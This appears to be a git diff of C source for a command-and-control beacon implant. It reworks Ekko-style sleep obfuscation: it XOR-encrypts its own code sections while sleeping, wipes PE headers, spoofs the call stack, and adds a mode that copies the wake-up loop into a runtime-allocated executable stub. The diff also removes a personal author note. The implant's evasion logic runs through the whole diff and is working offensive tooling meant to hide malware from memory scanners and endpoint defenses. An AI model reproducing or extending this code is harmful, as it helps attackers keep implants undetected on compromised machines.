@@ -9,6 +9,44 @@
             Beacon is SLEEPING!!!!!!!!
 
 */
+/* ---------------------------------------------------------------------------
+ * Ekko Implementation Selection (from generated_config.h)
+ * EKKO_IMPL = 1 : .obf section (static)
+ * EKKO_IMPL = 2 : runtime RX allocation (dynamic)
+ * ========================================================================== */
+#include "generated_config.h"
+#if !defined(EKKO_IMPL)
+#error "EKKO_IMPL not defined!"
+#elif EKKO_IMPL == 1
+#define EKKO_USE_OBF_SECTION 1
+#define EKKO_USE_RUNTIME_RX  0
+#elif EKKO_IMPL == 2
+#define EKKO_USE_OBF_SECTION 0
+#define EKKO_USE_RUNTIME_RX  1
+#else
+#error "Unknown EKKO_IMPL value"
+#endif
+
+/* ---------------------------------------------------------------------------
+ * Section Attributes - Conditional based on EKKO_IMPL
+ * ========================================================================== */
+#if EKKO_USE_RUNTIME_RX
+    #define EKKO_RX_SECTION __attribute__((section(".text$ekko")))
+    #define EKKO_RX_MARKER_A __attribute__((section(".text$ekko$a"), used, noinline))
+    #define EKKO_RX_MARKER_Z __attribute__((section(".text$ekko$z"), used, noinline))
+    #define EKKO_SEC_ATTR
+#elif EKKO_USE_OBF_SECTION
+    #define EKKO_SEC_ATTR __attribute__((section(".obf")))
+    #define EKKO_RX_SECTION EKKO_SEC_ATTR
+    #define EKKO_RX_MARKER_A EKKO_SEC_ATTR
+    #define EKKO_RX_MARKER_Z EKKO_SEC_ATTR
+#else
+    #define EKKO_RX_SECTION
+    #define EKKO_RX_MARKER_A
+    #define EKKO_RX_MARKER_Z
+    #define EKKO_SEC_ATTR
+#endif
+
 /* noinline from utils.h expands to __attribute__((noinline)) which breaks
  * when nested inside __attribute__((section(".obf"), noinline)). */
 #undef noinline
@@ -67,6 +105,11 @@ typedef struct _EKKO_CONTEXT {
     /* Saved NT_TIB values for restoration */
     PVOID               savedStackBase;
     PVOID               savedStackLimit;
+
+    /* Runtime-allocated RX stub for WaitingLoop (only for EKKO_IMPL=2)
+    maybe we should switcht to an union. TODO */
+    PVOID               rxStubBase;
+    SIZE_T              rxStubSize;
 } EKKO_CONTEXT;
 
 /* Global ctx pointer for the waiting loop */
@@ -76,16 +119,28 @@ static volatile EKKO_CONTEXT* g_EkkoCtx = NULL;
 static functionTable* g_ekkofuncTable = NULL;
 
 /* ==========================================================================
- * .obf SECTION - Code here stays RX and executable while .text is encrypted
+ * Forward declarations for RX stub functions (EKO_IMPL=2 only)
  * ========================================================================== */
 
-__attribute__((section(".obf"), noinline))
+typedef void (*WaitingLoopFn)();
+typedef void (*XorCryptFn)(uint8_t*, SIZE_T, const uint8_t*, SIZE_T);
+typedef void (*SecureZeroFn)(void*, SIZE_T);
+typedef void (CALLBACK *TimerCallbackFn)(PVOID, BOOLEAN);
+
+/* ==========================================================================
+ * .text$ekko SUBSECTION - Functions here will be copied to runtime RX allocation
+ * These functions are position-independent and don't call .text during sleep
+ * ========================================================================== */
+
+EKKO_RX_SECTION
+__attribute__((noinline, used))
 static void secureZero(void* buf, SIZE_T len) {
     volatile uint8_t* p = (volatile uint8_t*)buf;
     while (len--) *p++ = 0;
 }
 
-__attribute__((section(".obf"), noinline))
+EKKO_RX_SECTION
+__attribute__((noinline, used))
 static void xorCrypt(uint8_t* data, SIZE_T len, const uint8_t* key, SIZE_T keyLen) {
     for (SIZE_T i = 0; i < len; i++)
         data[i] ^= key[i % keyLen];
@@ -94,8 +149,9 @@ static void xorCrypt(uint8_t* data, SIZE_T len, const uint8_t* key, SIZE_T keyLe
 /* ---------------------------------------------------------------------------
  * TimerCallback - Signal the event to wake up the waiting loop
  * --------------------------------------------------------------------------- */
-__attribute__((section(".obf"), noinline))
-static void CALLBACK SleepObf_TimerCallback(PVOID lpParameter, BOOLEAN /*TimerOrWaitFired*/) {
+EKKO_RX_SECTION
+__attribute__((noinline, used))
+static void CALLBACK SleepObf_TimerCallback(PVOID lpParameter, BOOLEAN) {
     EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)lpParameter;
     if (ctx && ctx->nt && ctx->doneEvent) {
         ctx->nt->NtSetEvent(ctx->doneEvent, NULL);
@@ -104,13 +160,10 @@ static void CALLBACK SleepObf_TimerCallback(PVOID lpParameter, BOOLEAN /*TimerOr
 
 /* ---------------------------------------------------------------------------
  * WaitingLoop - Runs on helper stack while .text is encrypted.
- * This is a pain because we use indirect syscalls.
- * So the solution is to either... disable them... or use unhooked gadgets
- * from ntdll/kernel32.
- *							but what if unhooking is disabled?
- *							Decisions, decisions... TODO.
- * --------------------------------------------------------------------------- */
-__attribute__((section(".obf"), noinline))
+ * This function is COPIED to a runtime RX allocation (EKKO_IMPL=2).
+ * ========================================================================== */
+EKKO_RX_SECTION
+__attribute__((noinline, used))
 static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
     EKKO_CONTEXT* ctx = (EKKO_CONTEXT*)g_EkkoCtx;
     if (!ctx || !ctx->nt) return;
@@ -164,23 +217,20 @@ static void __attribute__((ms_abi)) SleepObf_WaitingLoop() {
 }
 
 /* ==========================================================================
- * Helper Functions (Preparation)
+ * Helper Functions (Preparation) - These run BEFORE encryption, can stay in .text
  * ========================================================================== */
 
-__attribute__((section(".obf"), noinline))
+/* im pretty sure we also have this code in syscall code, todo clean */
+__attribute__((noinline))
 static int enumerateCodeSections(PVOID imageBase, EKKO_SECTION_INFO* sections, int maxSections) {
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);
     PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS));
 
-    uintptr_t loopAddr = (uintptr_t)&SleepObf_WaitingLoop;
     int count = 0;
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
         uintptr_t secVA = (uintptr_t)imageBase + sec[i].VirtualAddress;
         SIZE_T secSize = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize) ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
-
-        /* Skip section containing our .obf safe zone */
-        if (loopAddr >= secVA && loopAddr < secVA + secSize) continue;
 
         if ((sec[i].Characteristics & IMAGE_SCN_CNT_CODE) && (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
             sections[count].base = (PVOID)secVA;
@@ -192,7 +242,7 @@ static int enumerateCodeSections(PVOID imageBase, EKKO_SECTION_INFO* sections, i
     return count;
 }
 
-__attribute__((section(".obf"), noinline))
+__attribute__((noinline))
 static void deriveXorKey(uint8_t out[XOR_KEY_LENGTH], const uint8_t configKey[32], const uint8_t beaconId[8]) {
     uint8_t seed[32];
     for (int i = 0; i < 8; i++) seed[i] = configKey[i] ^ beaconId[i];
@@ -201,10 +251,33 @@ static void deriveXorKey(uint8_t out[XOR_KEY_LENGTH], const uint8_t configKey[32
 }
 
 /* ==========================================================================
+ * External symbols for .text$ekko subsection bounds (defined by linker)
+ * Subsections sorted alphabetically: $a first, $z last
+ * Only used when EKKO_USE_RUNTIME_RX=1
+ * ========================================================================== */
+#if EKKO_USE_RUNTIME_RX
+EKKO_RX_MARKER_A
+static void __text_ekko_start_marker() {}
+EKKO_RX_MARKER_Z
+static void __text_ekko_end_marker() {}
+
+extern "C" {
+    extern void __text_ekko_start_marker();
+    extern void __text_ekko_end_marker();
+}
+#define __text_ekko_start ((char*)__text_ekko_start_marker)
+#define __text_ekko_end   ((char*)__text_ekko_end_marker)
+#else
+/* Dummy definitions for EKKO_USE_OBF_SECTION */
+#define __text_ekko_start ((char*)0)
+#define __text_ekko_end   ((char*)0)
+#endif
+
+/* ==========================================================================
  * Main Entry Point: SleepObf_Ekko
  * ========================================================================== */
 
-__attribute__((section(".obf"), noinline))
+__attribute__((noinline))
 bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep_ms, uint8_t jitter_pct) {
     (void)nt;
 
@@ -235,28 +308,75 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
     ctx->sectionCount = enumerateCodeSections(ctx->imageBase, ctx->sections, MAX_EKKO_SECTIONS);
     deriveXorKey(ctx->xorKey, config->crypto_key, config->beacon_id);
 
+#if EKKO_USE_RUNTIME_RX
+    /* --- Allocate RX stub for WaitingLoop + helpers (no .obf section) --- */
+    SIZE_T ekkoCodeSize = (SIZE_T)(__text_ekko_end - __text_ekko_start);
+    if (ekkoCodeSize == 0 || ekkoCodeSize > 0x10000) {
+        g_debugPrint("[SleepObf_Ekko] Invalid .text$ekko size: %zu", ekkoCodeSize);
+        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
+        return false;
+    }
+
+    /* Allocate RW initially, then make RX after copy */
+    PVOID rxStub = ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, ekkoCodeSize);
+    if (!rxStub) {
+        g_debugPrint("[SleepObf_Ekko] Failed to allocate RX stub");
+        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
+        return false;
+    }
+
+    /* Copy .text$ekko code to RX allocation */
+    __memcpy(rxStub, __text_ekko_start, ekkoCodeSize);
+
+    /* Verify copy integrity - check marker byte at start */
+    if (*(volatile uint8_t*)rxStub != *(volatile uint8_t*)__text_ekko_start) {
+        g_debugPrint("[SleepObf_Ekko] RX stub copy verification FAILED");
+        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, rxStub);
+        ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
+        return false;
+    }
+
+    /* Make it RX */
+    ULONG oldProtect = 0;
+    PVOID stubBase = rxStub;
+    SIZE_T stubSize = ekkoCodeSize;
+    ekkoNt->NtProtectVirtualMemory(NtCurrentProcess(), &stubBase, &stubSize, PAGE_EXECUTE_READ, &oldProtect);
+
+    ctx->rxStubBase = rxStub;
+    ctx->rxStubSize = ekkoCodeSize;
+    g_debugPrint("[SleepObf_Ekko] Allocated RX stub at %p (size=%zu)", rxStub, ekkoCodeSize);
+#else
+    /* EKKO_USE_OBF_SECTION: WaitingLoop lives in .obf section, no RX stub needed */
+    ctx->rxStubBase = NULL;
+    ctx->rxStubSize = 0;
+    g_debugPrint("[SleepObf_Ekko] Using .obf section for WaitingLoop");
+#endif
+
     /* 1. Setup synchronization */
     ekkoNt->NtCreateEvent(&ctx->doneEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE);
     ekkoNt->RtlCreateTimerQueue(&ctx->timerQueue);
     uint32_t sleepTime = ApplySleepJitter(sleep_ms, jitter_pct);
     ekkoNt->RtlCreateTimer(ctx->timerQueue, &ctx->timer, (WAITORTIMERCALLBACK)SleepObf_TimerCallback, ctx, sleepTime, 0, WT_EXECUTEINTIMERTHREAD);
 
-    /* 2. Capture original context (to return here after wake)
-     * RtlCaptureContext is better than GetThreadContext(self) for RIP accuracy. */
+    /* 2. Capture original context (to return here after wake) */
     ctx->originalContext.ContextFlags = CONTEXT_FULL;
     ekkoNt->RtlCaptureContext(&ctx->originalContext);
 
     /* TRICK: Check if we just woke up. If so, originalContext was just restored by NtContinue. */
     if (ctx->wokeUp) {
-        g_debugPrint("[SleepObf_Ekko] [+] Woke up! Resuming on original stack.");
-        g_debugPrint("[SleepObf_Ekko] [+] Restored Rsp=0x%llX Rip=0x%llX",
+        g_debugPrint("[+] Woke up! Resuming on original stack.");
+        g_debugPrint("[+] Restored Rsp=0x%llX Rip=0x%llX",
                      (UINT64)ctx->originalContext.Rsp,
                      (UINT64)ctx->originalContext.Rip);
-        
         ekkoNt->NtClose(ctx->doneEvent);
         if (ctx->helperStack) {
             ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx->helperStack);
         }
+#if EKKO_USE_RUNTIME_RX
+        if (ctx->rxStubBase) {
+            ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, ctx->rxStubBase);
+        }
+#endif
         ekkoNt->RtlFreeHeap(ekkoNt->parameters.processHeap, 0, (PVOID)ctx);
         return true;
     }
@@ -265,16 +385,19 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
     ctx->pivotContext.ContextFlags = CONTEXT_FULL;
     ekkoNt->RtlCaptureContext(&ctx->pivotContext);
     
-    /* Modify pivot context: RIP to WaitingLoop, RSP to helper stack */
+#if EKKO_USE_RUNTIME_RX
+    /* RIP points to WaitingLoop in our RX stub (not in .text) */
+    SIZE_T waitingLoopOffset = (SIZE_T)&SleepObf_WaitingLoop - (SIZE_T)__text_ekko_start;
+    ctx->pivotContext.Rip = (DWORD64)((BYTE*)ctx->rxStubBase + waitingLoopOffset);
+#else
+    /* RIP points directly to WaitingLoop in .obf section */
     ctx->pivotContext.Rip = (DWORD64)&SleepObf_WaitingLoop;
+#endif
 
     if (config->options.sleep_stack_spoof) {
         ctx->helperStackSize = EKKO_STACK_SIZE;
         ctx->helperStack = (uint8_t*)ekkoNt->RtlAllocateHeap(ekkoNt->parameters.processHeap, HEAP_ZERO_MEMORY, ctx->helperStackSize);
         if (ctx->helperStack) {
-            /* Collect resolved return addresses from the stack spoof chain.
-             * These are pre-resolved by ResolveStackChain() at boot, before
-             * .text encryption, using EAT parsing + last-ret scanning. */
             UINT64 frameAddrs[256];
             uint16_t addrCount = 0;
             if (config->stack_chain_count > 0 && config->stack_chain) {
@@ -300,7 +423,6 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
 
             ctx->pivotContext.Rsp = (DWORD64)(ctx->helperStack + ctx->helperStackSize - 0x200);
 
-            /* Save original TEB limits (to be restored by WaitingLoop) */
             PTEB teb = ekkoNt->parameters.TEB;
             ctx->savedStackBase = teb->NtTib.StackBase;
             ctx->savedStackLimit = teb->NtTib.StackLimit;
@@ -309,7 +431,7 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
 
     g_debugPrint("[SleepObf_Ekko] [+] originalContext: Rsp=0x%llX Rip=0x%llX",
                  (UINT64)ctx->originalContext.Rsp, (UINT64)ctx->originalContext.Rip);
-    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX",
+    g_debugPrint("[SleepObf_Ekko] [+] pivotContext: Rsp=0x%llX Rip=0x%llX (in RX stub)",
                  (UINT64)ctx->pivotContext.Rsp, (UINT64)ctx->pivotContext.Rip);
 
     /* 4. Encrypt sections (.text -> XOR -> RX) */
@@ -327,7 +449,7 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
     /* 5. Wipe headers (optional) */
     if (ctx->wipePeHeaders) {
         PVOID hdrBase = ctx->imageBase;
-        SIZE_T hdrSize = 0x1000;
+        SIZE_T hdrSize = 0x1000; /* why hardcode */
         ULONG oldProtect = 0;
         volatile uint8_t* p = (volatile uint8_t*)ctx->imageBase;
         for (SIZE_T j = 0; j < 0x1000; j++) ctx->peHeaderBackup[j] = p[j];
@@ -346,22 +468,4 @@ bool SleepObf_Ekko(functionTable* nt, const BeaconConfig* config, uint32_t sleep
 
     ekkoNt->NtContinue(&ctx->pivotContext, FALSE);
     return true; /* Never reached */
-    
 }
-/*
-    Hope no one ever reads this, but working on Pandragon is a honor.
-    It is the fruit of a lot of thoughts and efforts, and I hope it leaves
-    a lasting mark. Not only because I made it, but because I genuinely do believe
-    it can become insanely good and completely change how C2s are designed.
-    Though I also have heavy imposter syndrome. My, my.
-
-    Re-reading myself before saving... I must say:
-    Everything I have ever done was out of love. It is from the bottom of my heart that
-    I deliver this project. As an author I forgot said, in a book I forgot, "I seek to
-    start an endeavour beyond all that of which is known to men, so put your hopes in me"
-    Or maybe I'm mistranslating.
-                                Who's even going to read this?
-                                    Nerds.            
-    - Serexp.
-                    sudo pip instal root-hacker-elite==67.6.7
-*/
